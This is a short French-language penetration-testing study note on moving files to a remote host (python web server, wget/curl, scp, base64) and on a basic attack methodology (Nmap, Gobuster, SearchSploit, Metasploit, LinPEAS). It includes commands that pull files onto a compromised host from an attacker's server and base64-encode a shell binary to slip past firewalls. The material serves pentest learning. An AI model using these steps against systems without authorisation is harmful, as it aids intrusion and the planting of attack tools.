---
title:  "Transfert de fichiers"
category: "Les bases du test d'intrusion"
tag: "Introduction"
---
### Serveur python
L'endroit où on veut récupérer les fichiers (en écoute):
```console
Misoko@home$ cd /tmp
Misoko@home$ python3 -m http.server port
```

Côté client :
```console
user@remotehost$ wget http://IP:port/myfile
user@remotehost$ curl http://IP:port/myfile -o outputFileName
```

### SCP
Si on a accès à des identifiants SSH de l'hôte distant : 
```console
user@remotehost$ scp outputFileName user@remotehost:/tmp/myfile
```

### base64
Il arrive que nous ne puissions pas faire du transfert de fichiers (protections de pare-feux, etc).
Dans ce cas, on peut transférer une chaîne de caractère format base64 du fichier, et le décoder
au retour.

**Encodage**
```console
Misoko@htb[/htb]$ base64 shell -w 0
f0VM...mDwU
```
**Decodage**
```console
user@remotehost$ echo f0VM...mDwU | base64 -d > shell
```
### Vérification de formats
**Type de format**
```console
Misoko@home$ file myfile 
```

**Intégrité par md5**
```console
Misoko@home$ md5sum myfile 
```


# Methode de base 
- enumeration ou scan avec Nmap
- Empreinte web - on vérifie s'il y a des ports web ouverts.\ Si c'est le cas, on regarde les fichiers ou répertoires puis on utilise whatweb / Gobuster.
- Si on identifie l'URL du site web, on peut l'ajouter à notre fichier '/etc/hosts' avec l'IP obtenue dans le point précédent pour le charger normalement, bien que ce ne soit pas nécessaire.
- Utiliser SearchExploit pour trouver des exploits publics ou google.
- une fois qu'on a un accès initial (foothold), on utilise l'astuce **Python3 pty** pour avoir u pseudo **TTY**

Avoir un accès initial :
- **Metasploit**
- **De manière manuelle**

Elever les privilèges :
- Les scripts **LinEnum** et **LinPEAS** pour Linux
